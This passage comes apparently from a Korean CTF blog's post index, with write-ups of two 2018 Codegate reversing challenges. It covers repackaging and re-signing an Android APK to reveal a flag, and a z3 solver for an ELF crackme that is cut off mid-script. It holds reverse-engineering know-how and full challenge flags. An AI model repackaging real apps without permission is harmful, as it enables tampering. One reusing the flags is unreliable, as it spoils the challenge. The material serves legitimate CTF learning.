class=\"n\">bundle</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"kd\">super</span><span class=\"o\">.</span><span class=\"na\">onCreate</span><span class=\"o\">(</span><span class=\"n\">bundle</span><span class=\"o\">);</span>\n        <span class=\"n\">setContentView</span><span class=\"o\">((</span><span class=\"kt\">int</span><span class=\"o\">)</span> <span class=\"n\">R</span><span class=\"o\">.</span><span class=\"na\">layout</span><span class=\"o\">.</span><span class=\"na\">activity_main4</span><span class=\"o\">);</span>\n        <span class=\"n\">a</span><span class=\"o\">((</span><span class=\"n\">Toolbar</span><span class=\"o\">)</span> <span class=\"n\">findViewById</span><span class=\"o\">(</span><span class=\"n\">R</span><span class=\"o\">.</span><span class=\"na\">id</span><span class=\"o\">.</span><span class=\"na\">toolbar</span><span class=\"o\">));</span>\n        <span class=\"o\">((</span><span class=\"n\">FloatingActionButton</span><span class=\"o\">)</span> <span class=\"n\">findViewById</span><span class=\"o\">(</span><span class=\"n\">R</span><span class=\"o\">.</span><span class=\"na\">id</span><span class=\"o\">.</span><span class=\"na\">fab</span><span class=\"o\">)).</span><span class=\"na\">setOnClickListener</span><span class=\"o\">(</span><span class=\"k\">new</span> <span class=\"n\">OnClickListener</span><span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"kd\">final</span> <span class=\"cm\">/* synthetic */</span> <span class=\"n\">Main4Activity</span> <span class=\"n\">a</span><span class=\"o\">;</span>\n\n            <span class=\"o\">{</span>\n                <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">a</span> <span class=\"o\">=</span> <span class=\"n\">r1</span><span class=\"o\">;</span>\n            <span class=\"o\">}</span>\n\n            <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">onClick</span><span class=\"o\">(</span><span class=\"n\">View</span> <span class=\"n\">view</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                <span class=\"n\">Snackbar</span><span class=\"o\">.</span><span class=\"na\">a</span><span class=\"o\">(</span><span class=\"n\">view</span><span class=\"o\">,</span> <span class=\"s\">\"Replace with your own action\"</span><span class=\"o\">,</span> <span class=\"mi\">0</span><span class=\"o\">).</span><span class=\"na\">a</span><span class=\"o\">(</span><span class=\"s\">\"Action\"</span><span class=\"o\">,</span> <span class=\"kc\">null</span><span class=\"o\">).</span><span class=\"na\">a</span><span class=\"o\">();</span>\n            <span class=\"o\">}</span>\n        <span class=\"o\">});</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">loadLibrary</span><span class=\"o\">(</span><span class=\"s\">\"native-lib\"</span><span class=\"o\">);</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">l</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"n\">EditText</span><span class=\"o\">)</span> <span class=\"n\">findViewById</span><span class=\"o\">(</span><span class=\"n\">R</span><span class=\"o\">.</span><span class=\"na\">id</span><span class=\"o\">.</span><span class=\"na\">editText</span><span class=\"o\">);</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">l</span><span class=\"o\">.</span><span class=\"na\">setText</span><span class=\"o\">(</span><span class=\"n\">stringFromJNI</span><span class=\"o\">());</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kd\">native</span> <span class=\"n\">String</span> <span class=\"nf\">stringFromJNI</span><span class=\"o\">();</span>\n<span class=\"o\">}</span>\n</code></pre></div></div>\n<p><br />\nJNI가 나와서 lib 경로를 확인해보니, 아래와 같이 so 파일을 lib내에 포함하고 있는 것을 확인할 수 있었다.\n<img src=\"/images/2018-02-06-Codegate-CTF-Welcome-to-droid-125/lib.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] lib directory</i></p>\n\n<p>별다른 연산 작업은 보이지 않고 <code class=\"highlighter-rouge\">stringFromJNI()</code>를 통해 JNI()로 부터 값을 뿌려주고 있으므로 Main4Activity가 실행만 된다면, 해당 내용이 settext 되어 확인할 수 있을 것이다. 뿌려지는 값은 아마, flag가 되지 않을까 생각이 되었다.</p>\n\n<p>Main4Activity class 를 먼저 띄워 JNI()로부터 호출되는 Text를 확인하기 위해서, 아래와 같이 MainActivity로 잡혀있는 Entrypoint를 Main4Activity로 변경하도록 한다.</p>\n\n<p><img src=\"/images/2018-02-06-Codegate-CTF-Welcome-to-droid-125/before.png\" alt=\"\" />\n<img src=\"/images/2018-02-06-Codegate-CTF-Welcome-to-droid-125/after.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] fix AndroidManifest.xml</i></p>\n\n<p>XML 수정을 한 뒤에는, apktool을 이용해 수정된 apk를 재빌드 한다.</p>\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Codegate_CTF/문제백업/[Rev]Welcome to droid\n apktool b droid/\nI: Using Apktool 2.3.1\nI: Checking whether sources has changed...\nI: Smaling smali folder into classes.dex...\nI: Checking whether resources has changed...\nI: Building resources...\nS: WARNING: Could not write to <span class=\"o\">(</span>/Users/Mac/Library/apktool/framework<span class=\"o\">)</span>, using /var/folders/t_/3_spx9kn2j1072knxbnnwlvm0000gn/T/ instead...\nS: Please be aware this is a volatile directory and frameworks could go missing, please utilize <span class=\"nt\">--frame-path</span> <span class=\"k\">if </span>the default storage directory is unavailable\nI: Copying libs... <span class=\"o\">(</span>/lib<span class=\"o\">)</span>\nI: Building apk file...\nI: Copying unknown files/dir...\n</code></pre></div></div>\n<p><br /></p>\n\n<p>정상적으로 빌드되었다면, apk에 서명을 위해 필요한 파일이 있다는 가정하에 아래 sign.jar을 이용해 빌드된 apk 에 서명을 수행한다. (https://github.com/appium/sign 에서 sign.jar을 받을 수 있다. )</p>\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Codegate_CTF/문제백업/[Rev]Welcome to droid\n java <span class=\"nt\">-jar</span> ~/Desktop/lib_temp/sign.jar ./droid/dist/droid.apk\n\n jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Codegate_CTF/문제백업/[Rev]Welcome to droid\n <span class=\"nb\">ls</span> ./droid/dist/\ndroid.apk   droid.s.apk\n</code></pre></div></div>\n<p><br /></p>\n\n<p>본래 앱을 삭제하고, re-build 된 apk를 재설치 한 뒤, 실행해보면 아래와 같이 JNI()로부터 settext 된 flag 문자열을 확인할 수 있다.\n<img src=\"/images/2018-02-06-Codegate-CTF-Welcome-to-droid-125/result.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] Main4Activity - flag</i></p>\n\n<blockquote>\n  <p>Wol!! awesome!! FLAG{W3<em>w3r3_Back_70</em>$3v3n7een!!!} hahahah!!</p>\n</blockquote>\n\n<p align=\"right\"><strong>FLAG{W3_w3r3_Back_70_$3v3n7een!!!}</strong></p>\n"
    } ,
  
    {
      "title"    : "[2018_Codegate_CTF] RedVelvet (75)",
      "category" : "CTF2018_Codegate",
      "tags"     : "Reversing, z3, angr",
      "url"      : "/ctf/2018_codegate/2018/02/06/Codegate-CTF-RedVelvet-75/",
      "date"     : "2018-02-06 00:00:00 +0900",
      "content"   : "<h2 id=\"exercise\">Exercise</h2>\n\n<blockquote>\n  <p>Happiness:)\nDownload</p>\n</blockquote>\n\n<p><img src=\"/images/2018-02-06-Codegate-CTF-RedVelvet-75/exercise.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] exercise</i></p>\n\n<h2 id=\"solution1---z3-solver\">Solution1 - z3 Solver</h2>\n\n<p>일본에서 1달간 진행했던 산학연수를 마무리하고 귀국하는 날이라 정신이 없어, 팀원들에게 참가율이 매우 낮을 수 있다고 미리 얘기했었다. 귀국하고 잠깐 Droid 문제 본 것 외엔 제대로 문제도 보지 못하고 흐지부지 넘어갔던 <code class=\"highlighter-rouge\">2018 codegate</code> ㅠ…</p>\n\n<p>이 문제는 같은 팀원 중 한명이 이미 풀었던 문제이다. z3를 이용해서 해결할 수 있었는 문제인데, z3 사용 외에도 Angr를 이용해서도 해결 할 수 있는 문제이기에 풀 수 있는 방식을 쭉 정리해보려 한다.</p>\n\n<p>binary 정보를 확인해보면, 아래와 같이 64bit ELF 파일이다.</p>\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Codegate_CTF/reversing/RedVelvet\n file ./RedVelvet\n./RedVelvet: ELF 64-bit LSB executable, x86-64, version 1 <span class=\"o\">(</span>SYSV<span class=\"o\">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class=\"k\">for </span>GNU/Linux 2.6.32, BuildID[sha1]<span class=\"o\">=</span>84e7ef91c33878cf9eefc00a7a450895aa573494, not stripped\n</code></pre></div></div>\n\n<p>실행해보면, 아래와 같이 input 을 받는 것을 확인할 수 있는데 별다른 incorrect message 없이 그대로 binary 가 종료 된다.\n<img src=\"/images/2018-02-06-Codegate-CTF-RedVelvet-75/run.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] run</i></p>\n\n<p>바로, IDA 로 binary 분석을 해보면 정상적으로 decompile 되며, 아래와 같은 구조로 이뤄진 것을 볼 수 있다.</p>\n<pre><code class=\"language-C\">int __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char v3; // bl@0\n  __int64 v4; // rax@1\n  __int64 v5; // rcx@1\n  size_t v6; // rax@2\n  char v8; // t1@8\n  bool v9; // zf@8\n  signed int i; // [sp+8h] [bp-1B8h]@2\n  char v11; // [sp+50h] [bp-170h]@2\n  char s; // [sp+C0h] [bp-100h]@1\n  char v13; // [sp+C1h] [bp-FFh]@1\n  char v14; // [sp+C2h] [bp-FEh]@1\n  char v15; // [sp+C3h] [bp-FDh]@1\n  char v16; // [sp+C4h] [bp-FCh]@1\n  char v17; // [sp+C5h] [bp-FBh]@1\n  char v18; // [sp+C6h] [bp-FAh]@1\n  char v19; // [sp+C7h] [bp-F9h]@1\n  char v20; // [sp+C8h] [bp-F8h]@1\n  char v21; // [sp+C9h] [bp-F7h]@1\n  char v22; // [sp+CAh] [bp-F6h]@1\n  char v23; // [sp+CBh] [bp-F5h]@1\n  char v24; // [sp+CCh] [bp-F4h]@1\n  char v25; // [sp+CDh] [bp-F3h]@1\n  char v26; // [sp+CEh] [bp-F2h]@2\n  char v27; // [sp+CFh] [bp-F1h]@2\n  char v28; // [sp+D0h] [bp-F0h]@2\n  char v29; // [sp+D1h] [bp-EFh]@2\n  char v30; // [sp+D2h] [bp-EEh]@2\n  char v31; // [sp+D3h] [bp-EDh]@2\n  char v32; // [sp+D4h] [bp-ECh]@2\n  char v33; // [sp+D5h] [bp-EBh]@2\n  char v34; // [sp+D6h] [bp-EAh]@2\n  char v35; // [sp+D7h] [bp-E9h]@2\n  char v36; // [sp+D8h] [bp-E8h]@2\n  char v37; // [sp+D9h] [bp-E7h]@2\n  char v38[32]; // [sp+E0h] [bp-E0h]@2\n  char s1[80]; // [sp+100h] [bp-C0h]@3\n  char s2[8]; // [sp+150h] [bp-70h]@1\n  __int64 v41; // [sp+158h] [bp-68h]@1\n  __int64 v42; // [sp+160h] [bp-60h]@1\n  __int64 v43; // [sp+168h] [bp-58h]@1\n  __int64 v44; // [sp+170h] [bp-50h]@1\n  __int64 v45; // [sp+178h] [bp-48h]@1\n  __int64 v46; // [sp+180h] [bp-40h]@1\n  __int64 v47; // [sp+188h] [bp-38h]@1\n  __int64 v48; // [sp+190h] [bp-30h]@1\n  __int64 v49; // [sp+198h] [bp-28h]@1\n  __int64 v50; // [sp+1A0h] [bp-20h]@1\n  __int64 v51; // [sp+1A8h] [bp-18h]@1\n  int v52; // [sp+1B0h] [bp-10h]@1\n  __int64 v53; // [sp+1B8h] [bp-8h]@1\n\n  v53 = *MK_FP(__FS__, 40LL);\n  *(_QWORD *)s2 = 3905859155515433264LL;\n  v41 = 3990529441497888818LL;\n  v42 = 7017565014431380534LL;\n  v43 = 3977633058323522358LL;\n  v44 = 7364290724313116725LL;\n  v45 = 3991705742141175652LL;\n  v46 = 7363494672811320633LL;\n  v47 = 3847534474596595814LL;\n  v48 = 0LL;\n  v49 = 0LL;\n  v50 = 0LL;\n  v51 = 0LL;\n  v52 = 0;\n  printf((const char *)&amp;loc_4016CF + 1, argv, envp);\n  fgets(&amp;s, 27, edata);\n  func1((unsigned int)s, (unsigned int)v13);\n  func2((unsigned int)v13, (unsigned int)v14);\n  func3((unsigned int)v14, (unsigned int)v15);\n  func4((unsigned int)v15, (unsigned int)v16);\n  func5((unsigned int)v16, (unsigned int)v17);\n  func6((unsigned int)v17, (unsigned int)v18, (unsigned int)v19);\n  func7((unsigned int)v19, (unsigned int)v20, (unsigned int)v21);\n  func8((unsigned int)v21, (unsigned int)v22, (unsigned int)v23);\n  func9((unsigned int)v23, (unsigned int)v24, (unsigned int)v25);\n  v4 = ptrace(0, 0LL, 1LL, 0LL);\n  if ( v4 == -1 )\n  {\n    v8 = *(_BYTE *)v5;\n    v9 = v3 + *(_BYTE *)(v5 + 111) == 0;\n    *(_BYTE *)(v5 + 111) += v3;\n    JUMPOUT(!v9, &amp;unk_401746);\n    v6C &amp;= BYTE1(v4);\n    JUMPOUT(*(_QWORD *)\"ag : \");\n  }\n  func10((unsigned int)v25, (unsigned int)v26, (unsigned int)v27);\n  func11((unsigned int)v27, (unsigned int)v28, (unsigned int)v29);\n  func12((unsigned int)v29, (unsigned int)v30, (unsigned int)v31);\n  func13((unsigned int)v31, (unsigned int)v32, (unsigned int)v33);\n  func14((unsigned int)v33, (unsigned int)v34, (unsigned int)v35);\n  func15((unsigned int)v35, (unsigned int)v36, (unsigned int)v37);\n  SHA256_Init(&amp;v11);\n  v6 = strlen(&amp;s);\n  SHA256_Update(&amp;v11, &amp;s, v6);\n  SHA256_Final(v38, &amp;v11);\n  for ( i = 0; i &lt;= 31; ++i )\n    sprintf(&amp;s1[2 * i], \"%02x\", (unsigned __int8)v38[i]);\n  if ( strcmp(s1, s2) )\n    exit(1);\n  printf(\"flag : {\\\" %s \\\"}\\n\", &amp;s);\n  return 0;\n}\n</code></pre>\n\n<blockquote>\n  <p>위 decompile code를 보고 알 수 있는 사실은 27개의 문자열을 fgets로 입력 받으며, func 함수들을 통해 일련된 작업을 거친 뒤, SHA256 비교를 진행하고, flag를 출력하는 것을 확인할 수 있다.</p>\n</blockquote>\n\n<p>총 15개의 func이 존재하며, 각각의 func에는 아래와 같이 인자 값에 대한 비교 연산을 수행한다. 비교 연산 결과가 통과될 경우 <code class=\"highlighter-rouge\">HAPPINESS:)</code>라는 문자열을 출력하며, 아닐 경우 바로 binary를 종료한다.</p>\n\n<pre><code class=\"language-C\">int __fastcall func1(char a1, char a2)\n{\n  if ( a1 * 2 * (char)(a2 ^ a1) - a2 != 10858 )\n    exit(1);\n  if ( a1 &lt;= 85 || a1 &gt; 95 || a2 &lt;= 96 || a2 &gt; 111 )\n    exit(1);\n  return puts(\"HAPPINESS:)\");\n}\n</code></pre>\n\n<p>위에서 확인할 수 있듯이, 각각의 func들은 일련된 연산 작업으로 구성되어 있는데 이를 효율적으로 해결하기 위해서 <code class=\"highlighter-rouge\">z3</code>를 이용할 수 있다. 각각의 func에 들어가는 인자 값들을 문자열 배열 변수로 두고, 해당 변수들에 대해서 z3 조건문을 그대로 충족 시켜준다.</p>\n\n<p>총 a1~a27 까지 27개의 변수가 필요하다. <code class=\"highlighter-rouge\">z3</code> 에서 연산을 위한 각 변수를 선언한다. 아래는 위 <code class=\"highlighter-rouge\">RedVelvet</code> binary의 연산을 <code class=\"highlighter-rouge\">z3</code> 수식으로 변환한 내용이다. 꿀팁?이라기보단, 좀 더 편한 model 만드는 방식이 있는데, 대부분 IDA 에서 Hex-Ray로 Decompile된 Code에서 복잡한 수식을 <code class=\"highlighter-rouge\">z3</code>식으로 옮길 때, <code class=\"highlighter-rouge\">a1 * 2 * (a2 ^ a1) - a2 != 0x2A6A</code>라는 식이 있으면, s.add(<code class=\"highlighter-rouge\">a1 * 2 * (a2 ^ a1) - a2 == 0x2A6A</code>)와 같은 형태로 조건 식을 반대로 변환해서 작성한다.</p>\n\n<p>즉, 본 문제에서는 <code class=\"highlighter-rouge\">a1 * 2 * (a2 ^ a1) - a2 != 0x2A6A</code> 라는 식에 참이 될 경우 <code class=\"highlighter-rouge\">exit</code>로 빠지기 때문에 해당 조건에 맞지 않는 값을 찾아내야하는 것이다. 이 때, 해당 조건에 맞지 않는 값을 찾기 위해서 비교 연산자를 반대로 설정하는 과정이 필요하다. 하지만, 그럴 필요 없이 IDA 에서 수식을 슥 긁어와 <code class=\"highlighter-rouge\">Not()</code>으로 감싸주기만 하면 그대로 적용된다. &gt;, &lt; 같은 부등호 연산을 옮길 때, 특히 &lt;= 등으로 변환하는 과정에서 종종 실수할 수 있는데 편하게 <code class=\"highlighter-rouge\">Not()</code>을 적용 시키면 본래의 수식을 그대로 적용할 수 있기 때문에 굳이 바꿀 필요가 없다.</p>\n\n<div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kn\">from</span> <span class=\"nn\">z3</span> <span class=\"kn\">import</span> <span class=\"o\">*</span>\n\n<span class=\"n\">s</span> <span class=\"o\">=</span> <span class=\"n\">Solver</span><span class=\"p\">()</span>\n\n<span class=\"c\">#array = [ BitVec('a%i'%i,32) for i in range(1,27)]</span>\n<span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">27</span><span class=\"p\">):</span>\n    <span class=\"nb\">globals</span><span class=\"p\">()[</span><span class=\"s\">'a</span><span class=\"si\">%</span><span class=\"s\">i'</span><span class=\"o\">%</span><span class=\"n\">i</span><span class=\"p\">]</span><span class=\"o\">=</span><span class=\"n\">BitVec</span><span class=\"p\">(</span><span class=\"s\">'a</span><span class=\"si\">%</span><span class=\"s\">i'</span><span class=\"o\">%</span><span class=\"n\">i</span><span class=\"p\">,</span><span class=\"mi\">32</span><span class=\"p\">)</span>\n\n<span class=\"c\">#func1 a1, a2</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a1</span> <span class=\"o\">*</span> <span class=\"mi\">2</span> <span class=\"o\">*</span> <span class=\"p\">(</span><span class=\"n\">a2</span> <span class=\"o\">^</span> <span class=\"n\">a1</span><span class=\"p\">)</span> <span class=\"o\">-</span> <span class=\"n\">a2</span> <span class=\"o\">!=</span> <span class=\"mh\">0x2A6A</span> <span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a1</span> <span class=\"o\">&lt;=</span> <span class=\"mh\">0x55</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a1</span> <span class=\"o\">&gt;</span> <span class=\"mh\">0x5F</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a2</span> <span class=\"o\">&lt;=</span> <span class=\"mh\">0x60</span> <span class=\"p\">,</span><span class=\"n\">a2</span> <span class=\"o\">&gt;</span> <span class=\"mh\">0x6F</span><span class=\"p\">))</span>\n\n\n<span class=\"c\">#func2 a2, a3</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a2</span> <span class=\"o\">%</span> <span class=\"n\">a3</span> <span class=\"o\">!=</span> <span class=\"mi\">7</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a3</span> <span class=\"o\">&lt;=</span> <span class=\"mh\">0x5A</span><span class=\"p\">))</span>\n\n\n<span class=\"c\">#func3 a3, a4</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a3</span> <span class=\"o\">/</span> <span class=\"n\">a4</span> <span class=\"o\">+</span> <span class=\"p\">(</span><span class=\"n\">a4</span> <span class=\"o\">^</span> <span class=\"n\">a3</span><span class=\"p\">)</span> <span class=\"o\">!=</span> <span class=\"mi\">21</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a3</span> <span class=\"o\">&gt;</span> <span class=\"mi\">99</span><span class=\"p\">,</span> <span class=\"n\">a4</span> <span class=\"o\">&gt;</span> <span class=\"mi\">119</span><span class=\"p\">))</span>\n\n\n<span class=\"c\">#func4 a4, a5</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a4</span> <span class=\"o\">&lt;=</span> <span class=\"mi\">115</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a5</span> <span class=\"o\">!=</span> <span class=\"mi\">95</span><span class=\"p\">))</span>\n\n<span class=\"c\">#func5 a5, a6</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">((</span><span class=\"n\">a6</span> <span class=\"o\">+</span> <span class=\"n\">a5</span><span class=\"p\">)</span> <span class=\"o\">^</span> <span class=\"p\">(</span><span class=\"n\">a5</span> <span class=\"o\">^</span> <span class=\"n\">a6</span> <span class=\"o\">^</span> <span class=\"n\">a5</span><span class=\"p\">)</span> <span class=\"o\">!=</span> <span class=\"mi\">225</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span> <span class=\"n\">a5</span> <span class=\"o\">&lt;=</span> <span class=\"mi\">90</span><span class=\"p\">,</span> <span class=\"n\">a6</span> <span class=\"o\">&gt;</span> <span class=\"mi\">89</span><span class=\"p\">))</span>\n\n\n<span class=\"c\">#func6 a6, a7, a8</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a6</span> <span class=\"o\">&gt;</span> <span class=\"n\">a7</span><span class=\"p\">,</span> <span class=\"n\">a7</span> <span class=\"o\">&gt;</span> <span class=\"n\">a8</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a6</span> <span class=\"o\">&lt;=</span> <span class=\"mi\">85</span><span class=\"p\">,</span> <span class=\"n\">a7</span> <span class=\"o\">&lt;=</span> <span class=\"mi\">110</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a8</span> <span class=\"o\">&lt;=</span> <span class=\"mi\">115</span><span class=\"p\">,</span> <span class=\"p\">((</span><span class=\"n\">a7</span> <span class=\"o\">+</span> <span class=\"n\">a8</span><span class=\"p\">)</span> <span class=\"o\">^</span> <span class=\"p\">(</span><span class=\"n\">a6</span> <span class=\"o\">+</span> <span class=\"n\">a7</span><span class=\"p\">))</span> <span class=\"o\">!=</span> <span class=\"mi\">44</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">((</span><span class=\"n\">a7</span> <span class=\"o\">+</span> <span class=\"n\">a8</span><span class=\"p\">)</span> <span class=\"o\">%</span> <span class=\"n\">a6</span> <span class=\"o\">+</span> <span class=\"n\">a7</span> <span class=\"o\">!=</span> <span class=\"mi\">161</span><span class=\"p\">))</span>\n\n\n<span class=\"c\">#func7 a8, a9, a10</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a8</span> <span class=\"o\">&lt;</span> <span class=\"n\">a9</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a9</span> <span class=\"o\">&lt;</span> <span class=\"n\">a10</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a8</span> <span class=\"o\">&gt;</span> <span class=\"mi\">119</span><span class=\"p\">,</span> <span class=\"n\">a9</span> <span class=\"o\">&lt;=</span> <span class=\"mi\">90</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a10</span> <span class=\"o\">&gt;</span> <span class=\"mi\">89</span><span class=\"p\">,((</span><span class=\"n\">a8</span> <span class=\"o\">+</span> <span class=\"n\">a10</span><span class=\"p\">)</span> <span class=\"o\">^</span> <span class=\"p\">(</span><span class=\"n\">a9</span> <span class=\"o\">+</span> <span class=\"n\">a10</span><span class=\"p\">))</span> <span class=\"o\">!=</span> <span class=\"mi\">122</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">((</span><span class=\"n\">a8</span> <span class=\"o\">+</span> <span class=\"n\">a10</span><span class=\"p\">)</span> <span class=\"o\">%</span> <span class=\"n\">a9</span> <span class=\"o\">+</span> <span class=\"n\">a10</span> <span class=\"o\">!=</span> <span class=\"mi\">101</span><span class=\"p\">))</span>\n\n\n<span class=\"c\">#func8 a10, a11, a12</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a10</span> <span class=\"o\">&gt;</span> <span class=\"n\">a11</span><span class=\"p\">,</span> <span class=\"n\">a11</span> <span class=\"o\">&gt;</span> <span class=\"n\">a12</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a12</span> <span class=\"o\">&gt;</span> <span class=\"mi\">114</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">((</span><span class=\"n\">a10</span> <span class=\"o\">+</span> <span class=\"n\">a11</span><span class=\"p\">)</span> <span class=\"o\">/</span> <span class=\"n\">a12</span> <span class=\"o\">*</span> <span class=\"n\">a11</span> <span class=\"o\">!=</span> <span class=\"mi\">97</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">((</span><span class=\"n\">a12</span> <span class=\"o\">^</span> <span class=\"p\">(</span><span class=\"n\">a10</span> <span class=\"o\">-</span> <span class=\"n\">a11</span><span class=\"p\">))</span> <span class=\"o\">*</span> <span class=\"n\">a11</span> <span class=\"o\">!=</span> <span class=\"o\">-</span><span class=\"mi\">10088</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a12</span> <span class=\"o\">&gt;</span> <span class=\"mi\">114</span><span class=\"p\">))</span>\n\n<span class=\"c\">#func9 a12, a13, a14</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a12</span> <span class=\"o\">!=</span> <span class=\"n\">a13</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a13</span> <span class=\"o\">&lt;</span> <span class=\"n\">a14</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a14</span> <span class=\"o\">&gt;</span> <span class=\"mi\">99</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a14</span> <span class=\"o\">+</span> <span class=\"n\">a12</span> <span class=\"o\">*</span> <span class=\"p\">(</span><span class=\"n\">a14</span> <span class=\"o\">-</span> <span 